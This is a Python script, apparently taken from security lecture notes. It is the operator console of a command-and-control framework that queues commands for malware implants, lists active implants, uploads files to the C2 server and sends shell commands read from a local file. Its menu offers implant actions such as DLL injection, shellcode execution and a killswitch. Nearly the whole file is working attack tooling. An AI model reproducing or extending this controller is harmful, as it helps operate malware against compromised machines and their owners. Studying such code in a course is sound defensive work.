###from lecture notes

import requests 
import os

c2_server = "http://0.0.0.0:8080"
path = "/secret"
filepath = "/files/"

agent_id = '10101'
f = open("/Users/oliviazhou/Desktop/test.txt", "r")
shellcommand = f.read()
f.close()

def queue_cmd(cmd, agent_id):
    r = requests.post("{}{}".format(c2_server, path), json=[{"implant_id": agent_id, "cmd": cmd}])
    if r.text == "True":
        print("queued ")
    else:
        print("failed")


# checks the status of our task queue 
def print_queue():
    r = requests.get("{}/queue".format(c2_server))
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")

def print_implants():
    r = requests.get("{}/implants".format(c2_server))
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")
        
def upload_file(localpath, filename):
    print("make sure the file you're trying to upload is in the correct directory and exists")
    dfiles = open("{}{}".format(localpath, filename), "r")
    data = dfiles.read()  
    dfiles.close()
    r = requests.post("{}{}{}".format(c2_server,filepath,filename), json=[{"file_contents":data}])

def shell_command(shellcommand, agent_id):
    r = requests.post("{}/shell".format(c2_server), json=[{"shellcommand": shellcommand}])
    if r.text == "True":
        print("queued ")
    else:
        print("failed")


"""  
implant commands    
0 = sleep
1 = dllinjection
2 = shellcode
3 = killswitch
"""


if __name__ == "__main__":
    print("0 = sleep \n\
          1 = dllinjection \n\
          2 = shellcode \n\
          3 = killswitch\n")
    while True:
        cmd = input(">>")
        if cmd == "q":
            print_queue()
        elif cmd == "i":
            print_implants()
        elif "sid" in cmd:
            implant_id = cmd.split(" ")[1]
        elif cmd == 'u':
            localpath = input("enter file path>>>")
            filename = input("enter file name>>>")
            upload_file(localpath, filename)
        elif cmd == "\n":
            continue
        elif cmd == "2":
            shell_command(shellcommand, agent_id)
        else:
            queue_cmd(cmd, agent_id)